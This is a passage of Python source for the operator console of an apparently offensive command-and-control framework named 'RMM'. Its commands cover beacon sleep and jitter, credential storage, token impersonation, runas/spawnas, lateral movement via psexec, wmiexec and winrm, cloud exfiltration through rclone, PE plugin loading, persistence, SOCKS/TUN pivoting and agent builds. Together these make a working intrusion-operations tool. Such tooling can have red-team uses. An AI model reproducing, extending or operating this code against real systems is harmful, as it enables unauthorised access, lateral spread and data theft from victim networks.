        die(f"make_token failed ({code})" + (f": {detail}" if detail else ""), 1)
    if not data.get("ok"):
        die(f"make_token failed: {data.get('output')}", 1)
    say(data.get("output") or f"token created: {identity}")


def cmd_rev2self(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    say(f"Reverting {sid[:8]} to the agent identity (waits for the next beacon)...", err=True)
    code, data = client.rev2self(sid, timeout=args.timeout)
    if args.json:
        print_json(data)
        return
    if code != 200:
        detail = data.get("error") if isinstance(data, dict) else data
        die(f"rev2self failed ({code})" + (f": {detail}" if detail else ""), 1)
    if not data.get("ok"):
        die(f"rev2self failed: {data.get('output')}", 1)
    say(data.get("output") or "token reverted")


def cmd_creds_add(client: RmmApiClient, state: dict, args):
    domain, user = split_identity(args.user)
    if not user:
        die("Missing user in identity (use DOMAIN\\user or user)", 1)
    code, data = client.creds_add(domain, user, args.password)
    if args.json:
        print_json(data)
        return
    if code != 200:
        die(f"creds add failed ({code}): {data.get('error') if isinstance(data, dict) else data}", 1)
    say(f"stored {data.get('cred_id')} ({domain + chr(92) + user if domain else user})")


def cmd_creds_del(client: RmmApiClient, state: dict, args):
    if not args.cred_id.strip() or args.cred_id.startswith("-"):
        die("A credential ID is required after -i")
    code, data = client.creds_del(args.cred_id)
    if args.json:
        print_json(data)
        return
    if code not in (200, 404):
        die(f"creds del failed ({code}): {data.get('error') if isinstance(data, dict) else data}", 1)
    say(data.get("message") or ("deleted" if code == 200 else "not found"))


def cmd_creds_list(client: RmmApiClient, state: dict, args):
    code, data = client.creds_list()
    if args.json:
        print_json(data)
        return
    if code != 200:
        die(f"creds list failed ({code})", 1)
    creds = (data.get("creds") or []) if isinstance(data, dict) else []
    if not creds:
        say("no credentials stored")
        return
    for c in creds:
        identity = c.get("label", "?")
        say(f"  {c.get('cred_id') or c.get('id')}  {identity}")


def cmd_spawnas(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    cred_id = getattr(args, "cred_id", "") or ""
    user = getattr(args, "user", "") or ""
    domain = getattr(args, "domain", "") or ""
    password = getattr(args, "password", "") or ""
    if args.cred_id is not None:
        if not cred_id.strip() or cred_id.startswith("-"):
            die("A credential ID is required after -i", 1)
        if any(getattr(args, field, None) is not None for field in ("user", "domain", "password")):
            die("Use either -i <cred_id> or direct credentials, not both", 1)
    elif not user.strip() or args.password is None:
        die("Provide -i <cred_id> or --user and --password", 1)
    if not cred_id and domain == "" and "\\" in user:
        domain, user = user.split("\\", 1)
    verify = not getattr(args, "no_verify", False)
    say("Spawning agent under new identity (waits for the next beacon and registration)...", err=True)
    code, data = client.spawnas(sid, cred_id=cred_id, domain=domain, user=user,
                                password=password, verify=verify,
                                spawn_timeout=getattr(args, "spawn_timeout", 120),
                                register_timeout=getattr(args, "register_timeout", 60),
                                verify_timeout=getattr(args, "verify_timeout", 120))
    if args.json:
        print_json(data)
        if code != 200 or (isinstance(data, dict) and not data.get("ok") and not data.get("pending")):
            raise SystemExit(1)
        return
    if code != 200:
        detail = data.get("error") if isinstance(data, dict) else data
        die(f"spawnas failed ({code})" + (f": {detail}" if detail else ""), 1)
    if isinstance(data, dict):
        say(f"spawned session {data.get('spawned_session_id')} pid={data.get('spawn_pid')} identity={data.get('identity')}")
        if data.get("verify"):
            say(f"registered: {'yes' if data.get('registered') else 'no'}")
            if not data.get("registered"):
                warn("spawnas registration was not confirmed.")


def cmd_runas(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    cred_id = getattr(args, "cred_id", "") or ""
    user = getattr(args, "user", "") or ""
    domain = getattr(args, "domain", "") or ""
    password = getattr(args, "password", "") or ""
    if args.cred_id is not None:
        if not cred_id.strip() or cred_id.startswith("-"):
            die("A credential ID is required after -i", 1)
        if any(getattr(args, field, None) is not None for field in ("user", "domain", "password")):
            die("Use either -i <cred_id> or direct credentials, not both", 1)
    elif not user.strip() or args.password is None:
        die("Provide -i <cred_id> or --user and --password", 1)
    if not cred_id and domain == "" and "\\" in user:
        domain, user = user.split("\\", 1)
    say("Running command under new identity (waits for the next beacon)...", err=True)
    code, data = client.runas(sid, args.command, cred_id=cred_id, domain=domain,
                              user=user, password=password,
                              timeout=getattr(args, "timeout", 120))
    if args.json:
        print_json(data)
        return
    if code != 200:
        detail = data.get("error") if isinstance(data, dict) else data
        die(f"runas failed ({code})" + (f": {detail}" if detail else ""), 1)
    for line in (data.get("output") or "").splitlines() or ["(no output)"]:
        say(line)


def cmd_lateral(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    if not args.host.strip() or args.host.startswith("-"):
        die("A target hostname or IP address is required", 1)
    if getattr(args, "https", False) and args.method != "winrm":
        die("HTTPS is supported only for winrm", 1)
    if getattr(args, "insecure", False) and not getattr(args, "https", False):
        die("--insecure requires --https", 1)
    say(f"Lateral {args.method} to {args.host} (waits for the next beacon)...", err=True)
    code, data = client.lateral_move(
        sid,
        args.method,
        args.host,
        verify=not args.no_verify,
        exec_timeout=args.exec_timeout,
        register_timeout=args.register_timeout,
        verify_timeout=args.verify_timeout,
        **({"https": True} if getattr(args, "https", False) else {}),
        **({"insecure": True} if getattr(args, "insecure", False) else {}),
    )
    if args.json:
        print_json(data)
        if code != 200 or (not data.get("ok") and not data.get("pending")):
            raise SystemExit(1)
        return
    if code != 200:
        detail = data.get("error") if isinstance(data, dict) else data
        die(f"lateral failed ({code})" + (f": {detail}" if detail else ""), 1)
    if not data.get("ok"):
        print_json(data)
        if data.get("pending"):
            say("Deployment requested; registration was not checked. This is not confirmed success.")
            return
        die("Deployment unconfirmed: the expected agent has not registered. Inspect existing evidence before retrying.", 1)
    say(data.get("output") or f"lateral {args.method} started on {args.host}")
    if not data.get("verify"):
        say("Registration was not checked (--no-verify); this request remains unconfirmed.")
        return
    say(f"registered: {'yes' if data.get('registered') else 'no'}")
    if not data.get("registered"):
        warn("Lateral registration was not confirmed.")


def cmd_uid(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    say(f"Querying identity of {sid[:8]} (waits for the next beacon)...", err=True)
    code, data = client.session_uid(sid, timeout=args.timeout)
    if args.json:
        print_json(data)
        return
    if code != 200:
        detail = data.get("error") if isinstance(data, dict) else data
        die(f"uid failed ({code})" + (f": {detail}" if detail else ""), 1)
    print(data.get("output") or "")


def cmd_config_set_sleep(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.patch_config(sid, sleep_seconds=args.seconds)
    if code != 200:
        die(f"config failed ({code}): {data}")
    print(f"Sleep set to {args.seconds}s on server (watch interactive output for [config_ack] from agent)")


def cmd_config_set_jitter(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.patch_config(sid, jitter_percent=args.percent)
    if code != 200:
        die(f"config failed ({code}): {data}")
    print(f"Jitter set to {args.percent}% on server (watch interactive output for [config_ack] from agent)")


def cmd_download(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_download(sid, args.remote_path)
    if code != 200:
        die(f"download queue failed ({code}): {data}")
    print("Download queued — check server RMM_logs/downloads/ or poll events")


def cmd_exfil(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_exfil(
        sid,
        args.remote_path,
        profile=getattr(args, "profile", None),
        dest=getattr(args, "dest", None),
        mode=getattr(args, "mode", "auto"),
    )
    if code != 200:
        die(f"exfil queue failed ({code}): {data}")
    profile = data.get("profile") if isinstance(data, dict) else None
    execution_mode = data.get("execution_mode") if isinstance(data, dict) else None
    if profile:
        print(f"Profile: {profile}")
    if execution_mode:
        print(f"Execution mode: {execution_mode}")
    print("Exfil queued — poll events for cloud link or destination path")


def cmd_pe_load(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_pe_load(
        sid,
        args.plugin,
        export=getattr(args, "export", "Run"),
        plugin_input=getattr(args, "input", ""),
        command=getattr(args, "command", None),
    )
    if code != 200:
        die(f"pe load queue failed ({code}): {data}")
    print("PE plugin load queued — poll events for plugin output")


def cmd_pe_list(client: RmmApiClient, state: dict, args):
    code, data = client.list_plugins()
    if code != 200:
        die(f"plugin list failed ({code}): {data}")
    plugins = data.get("plugins", []) if isinstance(data, dict) else []
    if not plugins:
        print("No agent plugins found in the runtime plugin store")
    for plugin in plugins:
        print(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")


def cmd_plugin_release(client: RmmApiClient, state: dict, args):
    """Browse a GitHub release or install one pinned plugin without executing it."""
    try:
        if args.plugin_action == "releases":
            code, data = client.list_plugin_release(args.tag, args.source)
        else:
            code, data = client.install_plugin_release(args.name, args.tag, args.sha256, args.source, args.source_revision)
    except ValueError as exc:
        die(str(exc))
    if code not in (200, 201):
        die(f"plugin release request failed ({code}): {data}")
    if getattr(args, "json", False):
        print_json(data)
    elif args.plugin_action == "releases":
        print(f"{data.get('repository')} [{data.get('branch', '')}] version {data.get('version', '')} release {data.get('tag')}")
        for plugin in data.get("plugins", []):
            print(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")
    else:
        asset = data.get("asset", {})
        print(f"Installed {asset.get('name')} from {args.tag}; SHA-256 verified: {asset.get('sha256')}")


def cmd_plugin_sources(client: RmmApiClient, state: dict, args):
    """Manage persisted repository/branch sources without exposing credentials."""
    if args.source_action == "list":
        code, data = client.list_plugin_sources()
    elif args.source_action == "save":
        code, data = client.save_plugin_source(args.id, args.repository, args.branch, args.label, args.credential_env)
    else:
        code, data = client.remove_plugin_source(args.id)
    if code not in (200, 201):
        die(f"plugin source request failed ({code}): {data}")
    print_json(data)


def _print_rclone_config(data: dict) -> None:
    if data.get("load_error"):
        print(f"Profile load error: {data['load_error']}")
    bin_ok = "yes" if data.get("rclone_binary") else "no"
    scope = "workspace" if data.get("workspace_local") else "server"
    print(f"Upload from: agent  rclone bootstrap ({scope}): {bin_ok}  max_bytes: {data.get('max_bytes')}")
    print(f"Default profile: {data.get('default_profile')}")
    profiles = data.get("profiles") or []
    if not profiles:
        print("No rclone profiles configured; register an enabled rclone asset in the workspace")
    for p in profiles:
        name = p.get("name") or "?"
        ptype = p.get("type") or "?"
        folder = p.get("folder") or "/"
        print(f"  - {name} ({ptype}) folder={folder}")


def cmd_rclone_config(client: RmmApiClient, state: dict, args):
    code, data = client.get_rclone_config()
    if code != 200:
        die(f"rclone config failed ({code}): {data}")
    if getattr(args, "json", False):
        print(json.dumps(data, indent=2))
        return
    _print_rclone_config(data)


def cmd_assets(client: RmmApiClient, state: dict, args):
    """List, download, toggle, or remove dynamic operator assets."""
    action = getattr(args, "assets_cmd", "list")
    kind = getattr(args, "kind", None)
    if action == "list":
        code, data = client.list_assets(kind)
        if code != 200:
            die(f"asset list failed ({code}): {data}")
        if getattr(args, "json", False):
            print(json.dumps(data, indent=2))
            return
        rows = data.get("assets", []) if isinstance(data, dict) else []
        if not rows:
            print("No managed assets")
        for row in rows:
            state_text = "enabled" if row.get("enabled", True) else "disabled"
            print(f"{row.get('kind')}/{row.get('name')}  {state_text}  {row.get('size', '?')} bytes")
        return
    if action == "add":
        code, data = client.add_asset(args.kind, args.url, args.name, not args.disabled)
        if code not in (200, 201):
            die(f"asset download failed ({code}): {data}")
        print(json.dumps(data, indent=2) if getattr(args, "json", False) else f"Installed {args.kind} asset from {args.url}")
        return
    if action in {"enable", "disable"}:
        code, data = client.set_asset_enabled(args.kind, args.name, action == "enable")
        if code != 200:
            die(f"asset update failed ({code}): {data}")
        print(json.dumps(data, indent=2) if getattr(args, "json", False) else f"{action.title()}d {args.kind}/{args.name}")
        return
    if action == "remove":
        code, data = client.remove_asset(args.kind, args.name)
        if code != 200:
            die(f"asset removal failed ({code}): {data}")
        print(json.dumps(data, indent=2) if getattr(args, "json", False) else f"Removed {args.kind}/{args.name}")
        return
    die(f"unknown asset action: {action}")


def cmd_profile(client: RmmApiClient, state: dict, args):
    """Inspect or control the active RMM-Profile connector."""
    action = getattr(args, "profile_cmd", "status")
    if action == "status":
        code, data = client.profile_status()
    elif action == "start":
        config = None
        if getattr(args, "config_file", None):
            config = read_settings_json(args.config_file)
        code, data = client.start_profile(args.name, config)
    elif action == "stop":
        code, data = client.stop_profile()
    else:
        die(f"unknown profile action: {action}")
    if code not in (200, 201):
        die(f"profile {action} failed ({code}): {data}")
    if getattr(args, "json", False):
        print(json.dumps(data, indent=2))
        return
    if action == "status":
        profile = data.get("active") if isinstance(data, dict) else None
        print(f"Profile: {(profile or {}).get('name') or 'none'}")
        print(f"Beacon URL: {data.get('beacon_public_url') or data.get('public_url') or 'not connected'}")
    else:
        print(f"Profile {action} requested")


def cmd_ai(client: RmmApiClient, state: dict, args):
    """Inspect asynchronous AI jobs without resubmitting their work."""
    if args.ai_cmd == "jobs":
        code, data = client.list_ai_jobs(args.session_id or "")
    else:
        code, data = client.get_ai_job(args.job_id)
    if code != 200:
        die(f"AI job lookup failed ({code}): {data}")
    print(json.dumps(data, indent=2))


def cmd_agent(client: RmmApiClient, state: dict, args):
    """Fetch the agent template or render server-configured deployment artifacts."""
    action = getattr(args, "agent_cmd", "script")
    if action == "script":
        code, data = client.get_agent_script()
        if code != 200:
            die(f"agent script failed ({code}): {data}")
        content = data.get("content") or ""
        out = getattr(args, "out", None)
        if out:
            with open(out, "w", encoding="utf-8", newline="\n") as handle:
                handle.write(content)
            print(f"Wrote template to {out} ({len(content.encode('utf-8'))} bytes)")
            return
        print(json.dumps(data, indent=2))
        return
    if action == "deploy-script":
        code, data = client.deploy_agent_script(
            session_id=getattr(args, "session_id", "") or "",
            sleep_seconds=int(getattr(args, "sleep", 60)),
            jitter_percent=int(getattr(args, "jitter", 30)),
            http_proxy=getattr(args, "proxy", "") or "",
            **({"workspace_id": args.workspace_id} if getattr(args, "workspace_id", None) else {}),
        )
    elif action == "go-build":
        code, data = client.build_go_agent(
            goos=getattr(args, "goos", "windows"),
            goarch=getattr(args, "goarch", "amd64"),
            **({"config": {"workspace_id": args.workspace_id}} if getattr(args, "workspace_id", None) else {}),
            use_server_config=not getattr(args, "no_server_config", False),
            stageless=getattr(args, "stageless", False),
            debug=getattr(args, "debug", False),
        )
    elif action == "go-stage":
        code, data = client.stage_status(args.staging_id)
        if code == 200:
            print(json.dumps(data, indent=2))
        elif code == 404:
            die("staging entry not found, already purged, or expired")
        else:
            die(f"agent {action} failed ({code}): {data}")
        return
    else:
        die(f"unknown agent action: {action}")
        return
    if code not in (200, 201):
        die(f"agent {action} failed ({code}): {data}")
    print(json.dumps(data, indent=2))


def cmd_upload(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    if not args.local.startswith("artifact:") and not os.path.isfile(args.local):
        die(f"Local file not found: {args.local}")
    code, data = client.upload_file(sid, args.local, args.remote)
    if code != 200:
        die(f"upload failed ({code}): {data}")
    print(f"Upload queued: {args.local} -> {args.remote}")


def print_socks_relays(relays: list, *, json_mode: bool = False) -> None:
    if json_mode:
        print(json.dumps({"count": len(relays), "relays": relays}, indent=2))
        return
    if not relays:
        say("No active SOCKS relays")
        return
    for r in relays:
        host = r.get("hostname")
        user = r.get("username")
        agent = f"{user}@{host}" if host else r.get("session_id", "?")[:8]
        sid = r.get("session_id", "")[:8]
        url = r.get("socks_url", "")
        ch = r.get("agent_channel", "?")
        ws = "yes" if r.get("agent_websocket") else "no"
        tunnels = r.get("active_tunnels", 0)
        beacon = r.get("beacon_status", "?")
        say(
            f"{url}  →  {agent}  [session {sid}]  "
            f"channel={ch}  ws={ws}  tunnels={tunnels}  beacon={beacon}"
        )


def cmd_socks_list(client: RmmApiClient, state: dict, args):
    code, data = client.list_socks()
    if code != 200:
        die(f"socks list failed ({code}): {data}")
    print_socks_relays(data.get("relays", []), json_mode=getattr(args, "json", False))


def print_tun_relays(relays: list, *, json_mode: bool = False) -> None:
    if json_mode:
        print(json.dumps({"count": len(relays), "relays": relays}, indent=2))
        return
    if not relays:
        say("No active TUN relays")
        return
    for relay in relays:
        host = relay.get("hostname")
        user = relay.get("username")
        agent = f"{user}@{host}" if host else relay.get("session_id", "?")[:8]
        routes = relay.get("routes")
        if not isinstance(routes, list):
            routes = [relay.get("route")] if relay.get("route") else []
        route_label = ", ".join(str(route) for route in routes if route) or "manual"
        say(
            f"{relay.get('device', '?')}  →  {agent}  "
            f"[session {relay.get('session_id', '')[:8]}]  "
            f"routes={route_label}  "
            f"helper={'up' if relay.get('helper_alive') else 'down'}"
        )


def cmd_tun_list(client: RmmApiClient, state: dict, args):
    code, data = client.list_tun()
    if code != 200:
        die(f"tun list failed ({code}): {data}")
    print_tun_relays(data.get("relays", []), json_mode=getattr(args, "json", False))


def cmd_tun_start(client: RmmApiClient, state: dict, args):
    code, data = client.start_tun(
        args.session_ref,
        args.device,
        route=getattr(args, "route", ""),
        routes=getattr(args, "routes", None),
        tun_address=args.tun_address,
        interface=args.interface,
        mtu=args.mtu,
        udp_timeout_seconds=args.udp_timeout_seconds,
    )
    if code != 200:
        die(f"tun start failed ({code}): {data}")
    if getattr(args, "json", False):
        print_json(data)
    else:
        print(f"RMM TUN relay enabled on {args.device}")


def cmd_tun_stop(client: RmmApiClient, state: dict, args):
    code, data = client.stop_tun(args.session_ref)
    if code != 200:
        die(f"tun stop failed ({code}): {data}")
    if getattr(args, "json", False):
        print_json(data)
    else:
        print(f"RMM TUN relay stopped for {args.session_ref}")


def _resolve_session_id(client: RmmApiClient, state: dict, prefix: str):
    """Return full session id from prefix via API list."""
    code, data = client.list_sessions()
    if code != 200:
        return None
    matches = [s for s in data.get("sessions", []) if s["id"].startswith(prefix)]
    if len(matches) == 1:
        return matches[0]["id"]
    if len(matches) > 1:
        warn(f"Ambiguous session prefix '{prefix}':")
        for s in matches:
            warn(f"  {s['id'][:8]} {s['username']}@{s['hostname']}")
        return None
    code, data = client.get_session(prefix)
    if code == 200:
        return data["session"]["id"]
    return None


def _format_ago(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s ago"
    if seconds < 3600:
        return f"{seconds // 60}m ago"
    if seconds < 86400:
        return f"{seconds // 3600}h ago"
    return f"{seconds // 86400}d ago"


def _session_last_seen_display(session: dict) -> tuple[str, str]:
    """Return (ago label, beacon_status) from API session dict."""
    ago_s = session.get("last_seen_ago_seconds")
    status = session.get("beacon_status", "")
    if ago_s is None and session.get("last_seen"):
        try:
            from datetime import datetime

            seen = datetime.fromisoformat(session["last_seen"].replace("Z", "+00:00"))
            if seen.tzinfo:
                seen = seen.replace(tzinfo=None)
            ago_s = int((datetime.now() - seen).total_seconds())
        except Exception:
            ago_s = None
    ago_label = _format_ago(int(ago_s)) if ago_s is not None else "?"
    return ago_label, status or "?"


def _prompt(state: dict) -> str:
    sid = current_session(state)
    tag = f"[{sid[:8]}] " if sid else ""
    return f"RMM {tag}> "


def _show_help():
    help_text = """
Session:  /list | /use <id> | /info | /background | /kill [id]
Beacon:   /set_sleep <seconds> | /set_jitter <percent> | /show_config
Remote:   <command> or /run <command>  (queue) | /exec <command>  (wait) | /persist <cmd> | /stop
Spawn:    /spawn [id]   (same identity; children inherit the source build mode)
          /spawnas -i <cred_id>   (different identity; children inherit the source build mode)
          /runas -i <cred_id> <command>   (run command under different identity)
Creds:    /creds list | /creds add <domain\\user | user> <password> | /creds del -i <cred_id>
Identity: /make_token -i <cred_id> | /make_token <domain\\user | user> <password>  (runas /netonly style) | /rev2self | /uid
Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure]   (HTTPS/5986 for winrm only; inherits source build mode)
          -k requires -s and skips CA/name/revocation checks; certificate dates still apply.
Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
Plugins: /pe list | /pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
Config:   /rclone-config   (rclone profiles + bootstrap status)
Tunnel:   /socks list | /socks [port] | /socks stop   (SOCKS5 on 127.0.0.1, default 1080)
          /tun list | /tun start <device> | /tun stop
Other:    /events [since] | /health | /help | /quit
BloodHound: /bloodhound ACTION [--run-id ID] [--options-json '{"key":"value"}']

Tip: agent output and config_ack events stream for all connected sessions (prefix [session8]).
Tip: Type / for live command suggestions; arrows select, TAB inserts, Escape dismisses.
Tip: TAB also completes session id prefixes (after /list). Use /run for raw commands starting with /.
Status: online = recent poll; stale = late; offline = likely dead (re-run /list to refresh).
""".strip()
    for line in help_text.split("\n"):
        say(line)


def _refresh_completion_sessions(client: "RmmApiClient", state: dict) -> None:
    code, data = client.list_sessions()
    if code == 200:
        sessions = data.get("sessions", [])
        state["_completion_sessions"] = [s["id"][:8] for s in sessions]
    else:
        state.setdefault("_completion_sessions", [])


class RmmCliCompleter:
    """readline tab completion for the interactive operator CLI."""

    def __init__(self, state: dict):
        self.state = state

    def _session_prefixes(self):
        return self.state.get("_completion_sessions") or []

    def complete(self, text, state_index):
        if readline is None:
            return None
        line = readline.get_line_buffer()
        parts = line.split()

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            matches = ["/" + c for c in RMM_CLI_COMMANDS if ("/" + c).startswith(text.lower())] if line.lstrip().startswith("/") else []
            if state_index < len(matches):
                return matches[state_index] + " "
            return None

        cmd = parts[0][1:].lower() if parts[0].startswith("/") else ""

        if cmd in ("use", "kill", "spawn") and (
            len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))
        ):
            matches = [p for p in self._session_prefixes() if p.startswith(text)]
            if state_index < len(matches):
                return matches[state_index] + (" " if cmd == "use" else "")
            return None

        if cmd == "creds" and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))):
            matches = [sub for sub in ("list", "add", "del") if sub.startswith(text.lower())]
            return matches[state_index] + " " if state_index < len(matches) else None

        if cmd == "lateral" and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))):
            matches = [m for m in ("psexec", "wmiexec", "winrm") if m.startswith(text.lower())]
            return matches[state_index] + " " if state_index < len(matches) else None

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            matches = glob.glob(text + "*")
            if state_index < len(matches):
                return matches[state_index]
            return None

        return None


class RmmCliPTKCompleter(_PTCompleterBase):
    """Live completion for slash commands and their supported arguments."""

    def __init__(self, state: dict):
        super().__init__()
        self.state = state
        self._words = RmmCliCompleter(state)

    def get_completions(self, document, complete_event):
        from prompt_toolkit.completion import Completion

        line = document.text_before_cursor
        parts = line.split()
        if not line.lstrip().startswith("/"):
            return

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            prefix = parts[0] if parts else ""
            for cmd in RMM_CLI_COMMANDS:
                candidate = "/" + cmd
                if candidate.startswith(prefix.lower()):
                    yield Completion(candidate + " ", start_position=-len(prefix))
            return

        cmd = parts[0][1:].lower()

        if cmd in ("use", "kill", "spawn"):
            if len(parts) == 1 and line.endswith(" "):
                for p in self._words._session_prefixes():
                    yield Completion(p + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for p in self._words._session_prefixes():
                    if p.startswith(prefix):
                        yield Completion(p + (" " if cmd == "use" else ""), start_position=-len(prefix))
                return

        if cmd == "creds" and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))):
            prefix = parts[1] if len(parts) == 2 else ""
            for sub in ("list", "add", "del"):
                if sub.startswith(prefix.lower()):
                    yield Completion(sub + " ", start_position=-len(prefix))
            return

        if cmd == "lateral" and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))):
            prefix = parts[1] if len(parts) == 2 else ""
            for method in ("psexec", "wmiexec", "winrm"):
                if method.startswith(prefix.lower()):
                    yield Completion(method + " ", start_position=-len(prefix))
            return

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            prefix = parts[1]
            for m in glob.glob(prefix + "*"):
                yield Completion(m, start_position=-len(prefix))
            return


def _event_poller(client: RmmApiClient, state: dict, json_mode: bool):
    cursor = _event_cursor(state)
    while state.get("interactive_running"):
        code, data = client.list_sessions()
        if code == 401:
            state["interactive_running"] = False
            break
        if code == 200:
            for s in data.get("sessions", []):
                sid = s["id"]
                since = cursor.get(sid, 0)
                ec, edata = client.get_events(sid, since=since, limit=100, forward=True)
                if ec != 200:
                    continue
                prefix = sid[:8]
                events = sorted(
                    (e for e in edata.get("events", []) if e["id"] > since),
                    key=lambda e: e["id"],
                )
                for ev in events:
                    print_event(
                        ev,
                        json_mode,
                        session_prefix=prefix,
                        session_id=sid,
                        state=state,
                    )
                    cursor[sid] = max(cursor.get(sid, 0), ev["id"])
        time.sleep(EVENT_POLL_INTERVAL)


def _active_session(client: RmmApiClient, state: dict) -> str | None:
    sid = session_or_none(state)
    if not sid:
        return None
    code, _ = client.get_session(sid)
    if code == 404:
        warn(f"Session {sid[:8]} no longer active (cleared selection)")
        state.pop("current_session", None)
        save_state(state)
        return None
    if code == 401:
        warn("API token rejected — reconnect (quit and restart with RMM_API_TOKEN)")
        return None
    if code != 200:
        warn(f"Cannot verify session (HTTP {code})")
        return None
    return sid


def run_interactive(
    client: RmmApiClient,
    state: dict,
    json_mode: bool = False,
    start_data: dict | None = None,
):
    try:
        from prompt_toolkit import PromptSession
        from prompt_toolkit.history import FileHistory
        from prompt_toolkit.patch_stdout import patch_stdout
        from prompt_toolkit.key_binding import KeyBindings
        from prompt_toolkit.filters import has_completions
    except ImportError:
        die(
            "Interactive mode requires prompt_toolkit (fixed input line at the bottom).\n"
            "  pip install -r requirements.txt"
        )

    data = start_data or {}
    _refresh_completion_sessions(client, state)

    global _cli_use_ptk, _main_thread_id
    _cli_use_ptk = True
    _main_thread_id = threading.current_thread().ident

    bindings = KeyBindings()

    @bindings.add("escape", filter=has_completions)
    def dismiss_completions(event):
        """Dismiss the command menu without submitting the input."""
        event.current_buffer.cancel_completion()

    @bindings.add("tab", filter=has_completions)
    def accept_completion(event):
        """Insert the selected suggestion, or the first match, without submitting."""
        buffer = event.current_buffer
        completion = buffer.complete_state.current_completion or buffer.complete_state.completions[0]
        buffer.apply_completion(completion)

    ptk_session = PromptSession(
        history=FileHistory(HISTORY_FILE),
        completer=RmmCliPTKCompleter(state),
        complete_style="COLUMN",
        complete_while_typing=True,
        enable_history_search=False,
        key_bindings=bindings,
    )

    state["interactive_running"] = True
    _event_cursor(state)

    def _interactive_loop():
        while True:
            _drain_cli_output()
            try:
                line = ptk_session.prompt(
                    _prompt(state),
                    refresh_interval=OUTPUT_DRAIN_INTERVAL,
                )
            except EOFError:
                say()
                break
            except KeyboardInterrupt:
                say()
                continue

            if not line.strip():
                continue

            line = line.strip()
            internal = line.startswith("/")
            if internal:
                line = line[1:]
                if not line or line[0].isspace() or line.split()[0].lower() not in RMM_CLI_COMMANDS:
                    warn("Unknown internal command. Type /help for available commands.")
                    continue
            parts = line.split()
            cmd = parts[0].lower() if internal else ""
            rest = parts[1:]

            if cmd in ("quit", "exit"):
                break
            if cmd in ("help", "?"):
                _show_help()
                continue
            if cmd == "clear":
                _ptk_emit("\x1b[2J\x1b[H")
                continue
            if cmd == "bloodhound":
                dispatch_interactive_bloodhound(client, state, line)
                continue
            if cmd == "health":
                code, hdata = client.health()
                if code == 200:
                    say(f"ok ({hdata.get('sessions', 0)} sessions)")
                else:
                    warn(f"health {code}")
                continue
            if cmd == "list":
                code, sdata = client.list_sessions()
                if code != 200:
                    warn(f"list failed ({code})")
                    continue
                sessions = sdata.get("sessions", [])
                if not sessions:
                    say("No active sessions.")
                    say("  Start the Windows client: $env:RMM_BASE_URL / $env:RMM_BEACON_SECRET then client_rmm.ps1")
                    continue
                say(f"{'ID':<10} {'User':<15} {'Host':<20} {'Sleep':<8} {'Jitter':<8} {'Last seen':<12} {'Status':<8}")
                say("-" * 95)
                for s in sessions:
                    ago, status = _session_last_seen_display(s)
                    say(
                        f"{s['id'][:8]:<10} {s['username']:<15} {s['hostname']:<20} "
                        f"{s['sleep_seconds']:<8} {s['jitter_percent']:<7}% "
                        f"{ago:<12} {status:<8}"
                    )
                _refresh_completion_sessions(client, state)
                continue
            if cmd == "use":
                if not rest:
                    warn("Usage: /use <session_id>")
                    continue
                full = _resolve_session_id(client, state, rest[0])
                if not full:
                    warn(f"Session not found: {rest[0]}")
                    continue
                set_current_session(state, full)
                _sync_event_cursor(client, state, full)
                _refresh_completion_sessions(client, state)
                code, sdata = client.get_session(full)
                if code == 200:
                    s = sdata["session"]
                    say(f"Selected {s['username']}@{s['hostname']} [{full[:8]}]")
                continue
            if cmd == "background":
                state.pop("current_session", None)
                save_state(state)
                say("Returned to global view")
                continue
            if cmd == "info" or cmd == "show_config":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected. Use: /use <id>")
                    continue
                code, sdata = client.get_session(sid)
                if code != 200:
                    warn(f"info failed ({code})")
                    continue
                s = sdata["session"]
                for k, v in s.items():
                    say(f"  {k}: {v}")
                if cmd == "show_config":
                    j = s["jitter_percent"] / 100.0
                    lo = s["sleep_seconds"] * (1 - j)
                    hi = s["sleep_seconds"] * (1 + j)
                    say(f"  effective_range: {lo:.1f}s - {hi:.1f}s")
                continue
            if cmd == "kill":
                sid_arg = rest[0] if rest else None
                sid = session_or_none(state, sid_arg)
                if not sid and sid_arg:
                    sid = _resolve_session_id(client, state, sid_arg)
                if not sid:
                    warn("No session to kill")
                    continue
                code, kdata = client.kill_session(sid)
                if code != 200:
                    warn(f"kill failed ({code})")
                    continue
                if state.get("current_session") == kdata.get("session_id", sid):
                    state.pop("current_session", None)
                    save_state(state)
                say(f"Killed {kdata.get('session_id', sid)[:8]}")
                _refresh_completion_sessions(client, state)
                continue
            if cmd == "set_sleep":
                if not rest:
                    warn("Usage: /set_sleep <seconds>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                try:
                    sleep_val = int(rest[0])
                except ValueError:
